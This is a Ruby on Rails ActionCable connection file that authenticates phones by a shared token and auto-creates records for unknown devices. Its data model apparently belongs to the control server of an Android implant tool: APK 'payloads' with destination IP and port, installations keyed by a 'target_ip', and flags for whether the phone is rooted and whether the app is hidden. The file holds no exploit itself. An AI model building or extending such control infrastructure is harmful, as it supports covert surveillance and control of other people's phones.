module ApplicationCable
  class Connection < ActionCable::Connection::Base
    identified_by :current_smartphone

    def connect
      self.current_smartphone = find_verified_smartphone
      logger.info "Smartphone #{current_smartphone.device_id} connected to ActionCable"
    rescue ActiveRecord::RecordNotFound
      reject_unauthorized_connection
    end

    private

    def find_verified_smartphone
      device_token = request.params[:token] || request.headers['X-Device-Token']
      device_id = request.params[:device_id] || request.headers['X-Device-ID']

      # Validate token matches expected token
      begin
        expected_token = ENV.fetch('DEVICE_AUTH_TOKEN')
      rescue KeyError
        logger.error "ActionCable auth failed: DEVICE_AUTH_TOKEN not set in environment"
        reject_unauthorized_connection
      end
      
      if device_token.blank? || device_token != expected_token
        logger.warn "ActionCable auth failed: Invalid or missing token"
        raise ActiveRecord::RecordNotFound
      end

      if device_id.blank?
        logger.warn "ActionCable auth failed: Missing device_id"
        raise ActiveRecord::RecordNotFound
      end

      # Find smartphone by device_id
      smartphone = Smartphone.find_by(device_id: device_id)
      
      # Auto-create if not found to prevent rejection of new devices
      unless smartphone
        logger.info "ActionCable: New device #{device_id} connecting, auto-creating record..."
        smartphone = create_placeholder_device(device_id)
      end

      smartphone
    end

    def create_placeholder_device(device_id)
      # Retrying to prevent race conditions/deadlocks
      retries ||= 0

      # Ensure dependencies exist
      payload = ApkPayload.find_or_create_by!(name: 'default') do |apk|
        apk.destination_ip = '0.0.0.0'
        apk.destination_port = '8080'
      end

      # Use find_or_create_by! which relies on unique constraints or potential retry
      installation = ApkInstallation.find_or_create_by!(target_ip: device_id) do |record|
        record.apk_payload = payload
        record.status = 'installed'
      end

      # Find or create smartphone safely
      smartphone = Smartphone.find_or_create_by!(device_id: device_id) do |s|
        s.apk_installation = installation
        s.name = "Device #{device_id[0..7]}"
        s.operating_system = 'Android'
        s.is_rooted = 'Unknown'
        s.is_app_hidden = 'false'
      end
      
      smartphone
    rescue ActiveRecord::RecordNotUnique, ActiveRecord::RecordInvalid => e
      retry if (retries += 1) < 3
      logger.error "Failed to auto-create device (retry limit reached): #{e.message}"
      raise ActiveRecord::RecordNotFound
    rescue => e
      logger.error "Failed to auto-create device during connection: #{e.message}"
      # Still raise RecordNotFound to reject connection if creation fails
      raise ActiveRecord::RecordNotFound
    end
  end
end
